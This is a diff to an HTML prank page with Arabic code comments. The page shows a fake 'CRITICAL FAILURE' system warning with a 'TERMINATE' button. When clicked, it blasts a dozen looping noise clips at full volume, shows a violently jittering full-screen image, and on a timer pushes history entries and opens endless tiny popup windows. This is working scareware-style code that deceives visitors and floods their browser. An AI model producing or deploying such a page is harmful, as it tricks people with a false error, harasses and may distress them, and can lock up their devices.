@@ -3,61 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ WARNING ⚠️</title>
+    <title>☠️ SYSTEM_LOCK ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
         
-        /* الصورة كبيرة، واضحة، وتتحرك بجنون سواسوة */
+        /* الصورة كبيرة، واضحة، وتهتز بجنون سواسوة */
         #madwoman { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 1; display: none;
             will-change: transform;
         }
 
-        /* رسالة تحذيرية كلاسيكية (بلا ميزة التحديث) سواسوة */
+        /* رسالة تحذيرية مرعبة سواسوة */
         #ui { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); z-index: 1000; display: flex; 
+            background: rgba(0,0,0,0.95); z-index: 1000; display: flex; 
             flex-direction: column; justify-content: center; align-items: center;
             font-family: 'Courier New', monospace; color: #f00; text-align: center;
         }
-        .header { font-size: 30px; margin-bottom: 20px; font-weight: bold; text-shadow: 0 0 10px #f00; }
+        .header { font-size: 28px; margin-bottom: 15px; font-weight: bold; text-shadow: 0 0 15px #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        .btn-start { 
-            background: #f00; color: #000; border: none; padding: 20px 50px; 
-            font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 30px;
+        .btn-panic { 
+            background: #f00; color: #000; border: none; padding: 20px 60px; 
+            font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 30px;
+            box-shadow: 0 0 20px #f00;
         }
     </style>
 </head>
-<body onclick="launchTotalMadness()">
+<body onclick="igniteChaos()">
 
     <div id="ui">
-        <h1 class="blink">☠️ CRITICAL SYSTEM ERROR ☠️</h1>
-        <p>Memory Corruption in Sector 0x00451<br>Click to attempt data recovery.</p>
-        <button class="btn-start">RECOVER DATA</button>
+        <h1 class="blink">☢️ CRITICAL FAILURE ☢️</h1>
+        <p>Illegal process detected in background.<br>Click to terminate and secure data.</p>
+        <button class="btn-panic">TERMINATE</button>
     </div>
 
     <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="allSounds">
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+    <div id="audioVault">
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
     </div>
 
     <script>
         let aCtx, analyser, data;
         const img = document.getElementById('madwoman');
 
-        function launchTotalMadness() {
-            // 1. تشغيل كامل الأصوات سواسوة
-            document.querySelectorAll('.h').forEach(a => { a.volume = 1.0; a.play(); });
+        function igniteChaos() {
+            // 1. إطلاق كامل الأصوات سواسوة (الكل يخدم في رحبة)
+            document.querySelectorAll('.s').forEach(a => { 
+                a.volume = 1.0; 
+                a.play(); 
+            });
 
             document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
@@ -67,17 +75,15 @@
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 150);
+            }, 180);
 
-            setupMadnessSync();
+            startJitterEngine();
         }
 
-        window.onpopstate = () => history.go(1);
-
-        function setupMadnessSync() {
+        function startJitterEngine() {
             aCtx = new (window.AudioContext || window.webkitAudioContext)();
-            // نربط المحلل بصوت "قوقو قاقا" لأنه فيه ضجيج عالي سواسوة
-            const source = aCtx.createMediaElementSource(document.querySelectorAll('.h')[2]);
+            // نأخذ صوت قوقو قاقا كمحرك للرعشة سواسوة
+            const source = aCtx.createMediaElementSource(document.querySelectorAll('.s')[2]);
             analyser = aCtx.createAnalyser();
             analyser.fftSize = 256;
             data = new Uint8Array(analyser.frequencyBinCount);
@@ -86,25 +92,23 @@
             
             if (aCtx.state === 'suspended') aCtx.resume();
             
-            runMadAnimation();
+            updateVisualMadness();
         }
 
-        function runMadAnimation() {
+        function updateVisualMadness() {
             analyser.getByteFrequencyData(data);
-            let volume = 0;
-            for(let i=0; i<data.length; i++) volume += data[i];
-            volume = volume / data.length;
+            let avg = data.reduce((a, b) => a + b) / data.length;
 
-            // 3. الرعشة الهستيرية (تتحرك مع الأصوات كاملة) سواسوة
-            const intensity = (volume / 255) * 80; 
-            const tx = (Math.random() - 0.5) * intensity * 2;
-            const ty = (Math.random() - 0.5) * intensity * 2;
-            const rot = (Math.random() - 0.5) * intensity;
-            const sc = 1 + (volume / 255) * 0.4;
+            // 3. ميزة الرعشة: الصورة ترعد وتتكبر على حساب قوة الأصوات المخلطة سواسوة
+            const intensity = (avg / 255) * 70; 
+            const x = (Math.random() - 0.5) * intensity * 2.5;
+            const y = (Math.random() - 0.5) * intensity * 2.5;
+            const r = (Math.random() - 0.5) * intensity;
+            const s = 1 + (avg / 255) * 0.45;
 
-            img.style.transform = `translate(${tx}px, ${ty}px) rotate(${rot}deg) scale(${sc})`;
+            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
             
-            requestAnimationFrame(runMadAnimation);
+            requestAnimationFrame(updateVisualMadness);
         }
     </script>
 </body>
